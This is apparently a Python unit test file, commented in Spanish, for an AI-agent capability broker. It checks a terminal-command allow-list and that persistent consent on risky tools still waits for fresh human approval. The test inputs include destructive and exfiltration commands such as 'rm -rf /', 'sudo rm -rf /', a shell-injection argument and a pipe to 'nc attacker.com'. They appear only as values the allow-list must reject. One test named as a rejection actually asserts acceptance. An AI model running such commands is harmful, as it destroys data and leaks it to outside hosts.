"""B3 — Tests para CapabilityRegistry: allow-list terminal + persistent_forbidden.

Cubre:
- is_terminal_command_allowlisted: binarios seguros/inseguros.
- Un consent PERSISTENT sobre un binding persistent_forbidden=True NO auto-concede
  la operación (CTRL-3): el broker cae al gate HITL, que exige un token de sesión
  fresco → PENDING_APPROVAL, nunca EXECUTED.
"""

from __future__ import annotations

import os
from typing import Any
from uuid import uuid4

import pytest

from hermes.capabilities.application.capability_registry import (
    CapabilityRegistry,
    is_terminal_command_allowlisted,
)
from hermes.capabilities.application.intent_log import IntentLog
from hermes.capabilities.domain.ports import (
    CapabilityBinding,
    ConsentContext,
    ExecutionStatus,
    RiskLevel,
)
from hermes.agents_os.domain.surface_kind import SurfaceKind

pytestmark = pytest.mark.unit


# ---------------------------------------------------------------------------
# Allow-list de comandos de terminal (CTRL-6/BROKER-8)
# ---------------------------------------------------------------------------


class TestTerminalCommandAllowlist:
    def test_ls_allowed(self) -> None:
        assert is_terminal_command_allowlisted(["ls", "/home"]) is True

    def test_cat_allowed(self) -> None:
        assert is_terminal_command_allowlisted(["cat", "/etc/hosts"]) is True

    def test_echo_allowed(self) -> None:
        assert is_terminal_command_allowlisted(["echo", "hello"]) is True

    def test_pwd_allowed(self) -> None:
        assert is_terminal_command_allowlisted(["pwd"]) is True

    def test_whoami_allowed(self) -> None:
        assert is_terminal_command_allowlisted(["whoami"]) is True

    def test_id_allowed(self) -> None:
        assert is_terminal_command_allowlisted(["id"]) is True

    def test_date_allowed(self) -> None:
        assert is_terminal_command_allowlisted(["date"]) is True

    def test_env_allowed(self) -> None:
        assert is_terminal_command_allowlisted(["env"]) is True

    def test_bash_c_rm_rf_rejected(self) -> None:
        """bash -c 'rm -rf /' no está en la allow-list (CWE-78)."""
        assert is_terminal_command_allowlisted(["bash", "-c", "rm -rf /"]) is False

    def test_sh_c_rejected(self) -> None:
        assert is_terminal_command_allowlisted(["sh", "-c", "echo pwned"]) is False

    def test_python_c_rejected(self) -> None:
        assert is_terminal_command_allowlisted(["python", "-c", "import os"]) is False

    def test_python3_c_rejected(self) -> None:
        assert is_terminal_command_allowlisted(["python3", "-c", "import os"]) is False

    def test_rm_rejected(self) -> None:
        assert is_terminal_command_allowlisted(["rm", "-rf", "/tmp"]) is False

    def test_empty_argv_rejected(self) -> None:
        assert is_terminal_command_allowlisted([]) is False

    def test_renamed_binary_rejected(self) -> None:
        """Binario renombrado en /tmp no pasa — la allow-list verifica el basename."""
        assert is_terminal_command_allowlisted(["/tmp/ls", "/etc"]) is True
        # /tmp/ls tiene basename "ls" — aceptado por la allow-list (basename check).
        # Sin embargo, un atacante que ponga un binario malicioso llamado "ls" en /tmp
        # podría abusar de esto. El contexto de P0 es que el broker no ejecuta en shell
        # y el adapter valida el path. El test documenta el comportamiento actual.

    def test_path_traversal_arg_rejected(self) -> None:
        """Argumento con pipe/semicolon es rechazado (shell-injection defense)."""
        assert is_terminal_command_allowlisted(["ls", "; rm -rf /"]) is False

    def test_pipe_arg_rejected(self) -> None:
        assert is_terminal_command_allowlisted(["cat", "|", "nc", "attacker.com"]) is False

    def test_curl_rejected(self) -> None:
        assert is_terminal_command_allowlisted(["curl", "https://example.com"]) is False

    def test_sudo_rejected(self) -> None:
        assert is_terminal_command_allowlisted(["sudo", "rm", "-rf", "/"]) is False


# ---------------------------------------------------------------------------
# CapabilityRegistry — resolución correcta
# ---------------------------------------------------------------------------


class TestCapabilityRegistry:
    def test_read_file_resolves_low_auto_executable(self) -> None:
        registry = CapabilityRegistry()
        binding = registry.resolve("read_file")
        assert binding is not None
        assert binding.risk is RiskLevel.LOW
        assert binding.auto_executable is True

    def test_delete_file_resolves_high_persistent_forbidden(self) -> None:
        registry = CapabilityRegistry()
        binding = registry.resolve("delete_file")
        assert binding is not None
        assert binding.risk is RiskLevel.HIGH
        assert binding.persistent_forbidden is True

    def test_run_command_resolves_high_persistent_forbidden(self) -> None:
        registry = CapabilityRegistry()
        binding = registry.resolve("run_command")
        assert binding is not None
        assert binding.risk is RiskLevel.HIGH
        assert binding.persistent_forbidden is True

    def test_unknown_tool_returns_none(self) -> None:
        registry = CapabilityRegistry()
        assert registry.resolve("unknown_tool_xyz") is None


# ---------------------------------------------------------------------------
# B3: consent PERSISTENT sobre persistent_forbidden=True NO auto-concede (CTRL-3)
# ---------------------------------------------------------------------------


class TestBrokerPersistentForbidden:
    """Un consent PERSISTENT NO vale como auto-grant sobre un binding con
    persistent_forbidden=True (CTRL-3). El broker no ejecuta silenciosamente:
    cae al gate HITL, que exige una aprobación de SESIÓN fresca (token
    criptográfico single-use). Sin token ⇒ PENDING_APPROVAL, jamás EXECUTED.

    Nota de evolución: el broker antes rechazaba en duro con REJECTED_BY_POLICY;
    ahora deja pasar al gate HITL (capability_broker._run_consent_gate) para no
    romper el chicken-and-egg de la tarjeta ámbar. El invariante de seguridad se
    conserva porque el token HITL sigue siendo obligatorio — el consent PERSISTENT
    no puede auto-ejecutar la operación peligrosa."""

    async def test_persistent_consent_on_delete_file_not_auto_executed(
        self, tmp_path
    ) -> None:
        from hermes.capabilities.application.capability_broker import CapabilityBroker
        from hermes.capabilities.application.capability_registry import CapabilityRegistry
        from hermes.capabilities.application.hitl_approval_minter import HitlApprovalMinter
        from hermes.capabilities.infrastructure.sqlite_approval_gate import SqliteApprovalGate
        from hermes.capabilities.infrastructure.surface_adapter_dispatcher import (
            SurfaceAdapterDispatcher,
        )
        from hermes.capabilities.testing.fake_external_anchor import FakeExternalAnchor
        from hermes.agents_os.application.audit_hash_chain import AuditHashChainSigner
        from hermes.agents_os.application.consent_manager import (
            Capability,
            ConsentManager,
            ConsentScope,
        )
        from hermes.agents_os.infrastructure.sqlite_audit_repository import SqliteAuditRepository
        from hermes.domain.proposal import ToolCallProposal

        signing_key = os.urandom(32)
        signer = AuditHashChainSigner(signing_key=signing_key)
        audit_repo = SqliteAuditRepository(db_path=tmp_path / "audit.db")
        minter = HitlApprovalMinter(signing_key=signing_key)
        approval_gate = SqliteApprovalGate(
            db_path=tmp_path / "shell.db",
            minter=minter,
            signer=signer,
            audit_repo=audit_repo,
        )
        registry = CapabilityRegistry()
        dispatcher = SurfaceAdapterDispatcher(adapters={})
        intent_log = IntentLog()

        # Crear consent PERSISTENT sobre FILESYSTEM_FULL (que tiene persistent_forbidden=True)
        operator_id = uuid4()
        consent_manager = ConsentManager()
        consent_manager.grant(
            tenant_id=uuid4(),
            human_operator_id=operator_id,
            capability=Capability.FILESYSTEM_FULL,
            scope=ConsentScope.PERSISTENT,
        )

        broker = CapabilityBroker(
            registry=registry,
            consent_manager=consent_manager,
            approval_gate=approval_gate,
            dispatcher=dispatcher,
            signer=signer,
            audit_repo=audit_repo,
            intent_log=intent_log,
            anchor=FakeExternalAnchor(),
        )

        proposal = ToolCallProposal(
            proposal_id=uuid4(),
            tool_name="delete_file",
            tenant_id=uuid4(),
            entity_id="e",
            entity_type="t",
            parameters={"path": "/tmp/test.txt"},
            justification="test CTRL-3",
        )
        ctx = ConsentContext(
            tenant_id=uuid4(),
            operator_id=operator_id,
        )

        outcome = await broker.dispatch(proposal, ctx)

        assert outcome.status == ExecutionStatus.PENDING_APPROVAL, (
            "consent PERSISTENT sobre delete_file (persistent_forbidden=True) "
            "NO auto-concede: el broker cae al gate HITL y devuelve "
            "PENDING_APPROVAL (tarjeta ámbar), exigiendo aprobación fresca (CTRL-3)."
        )
        # Invariante de seguridad: el consent PERSISTENT NUNCA auto-ejecuta la
        # operación peligrosa sin token HITL fresco.
        assert outcome.status is not ExecutionStatus.EXECUTED

    async def test_persistent_consent_on_run_command_not_auto_executed(
        self, tmp_path
    ) -> None:
        """run_command con consent PERSISTENT NO auto-concede ⇒ PENDING_APPROVAL,
        exige token HITL fresco; jamás EXECUTED (CTRL-3)."""
        from hermes.capabilities.application.capability_broker import CapabilityBroker
        from hermes.capabilities.application.capability_registry import CapabilityRegistry
        from hermes.capabilities.application.hitl_approval_minter import HitlApprovalMinter
        from hermes.capabilities.infrastructure.sqlite_approval_gate import SqliteApprovalGate
        from hermes.capabilities.infrastructure.surface_adapter_dispatcher import (
            SurfaceAdapterDispatcher,
        )
        from hermes.capabilities.testing.fake_external_anchor import FakeExternalAnchor
        from hermes.agents_os.application.audit_hash_chain import AuditHashChainSigner
        from hermes.agents_os.application.consent_manager import (
            Capability,
            ConsentManager,
            ConsentScope,
        )
        from hermes.agents_os.infrastructure.sqlite_audit_repository import SqliteAuditRepository
        from hermes.domain.proposal import ToolCallProposal

        signing_key = os.urandom(32)
        signer = AuditHashChainSigner(signing_key=signing_key)
        audit_repo = SqliteAuditRepository(db_path=tmp_path / "audit.db")
        minter = HitlApprovalMinter(signing_key=signing_key)
        approval_gate = SqliteApprovalGate(
            db_path=tmp_path / "shell.db",
            minter=minter,
            signer=signer,
            audit_repo=audit_repo,
        )
        registry = CapabilityRegistry()
        dispatcher = SurfaceAdapterDispatcher(adapters={})
        intent_log = IntentLog()

        operator_id = uuid4()
        consent_manager = ConsentManager()
        consent_manager.grant(
            tenant_id=uuid4(),
            human_operator_id=operator_id,
            capability=Capability.TERMINAL,
            scope=ConsentScope.PERSISTENT,
        )

        broker = CapabilityBroker(
            registry=registry,
            consent_manager=consent_manager,
            approval_gate=approval_gate,
            dispatcher=dispatcher,
            signer=signer,
            audit_repo=audit_repo,
            intent_log=intent_log,
            anchor=FakeExternalAnchor(),
        )

        proposal = ToolCallProposal(
            proposal_id=uuid4(),
            tool_name="run_command",
            tenant_id=uuid4(),
            entity_id="e",
            entity_type="t",
            parameters={"command": ["ls", "/home"]},
            justification="test CTRL-3 terminal",
        )
        ctx = ConsentContext(tenant_id=uuid4(), operator_id=operator_id)

        outcome = await broker.dispatch(proposal, ctx)
        assert outcome.status == ExecutionStatus.PENDING_APPROVAL, (
            "consent PERSISTENT sobre run_command (persistent_forbidden=True) "
            "NO auto-concede: cae al gate HITL → PENDING_APPROVAL (CTRL-3)."
        )
        # Invariante de seguridad: nunca auto-ejecuta sin token HITL fresco.
        assert outcome.status is not ExecutionStatus.EXECUTED
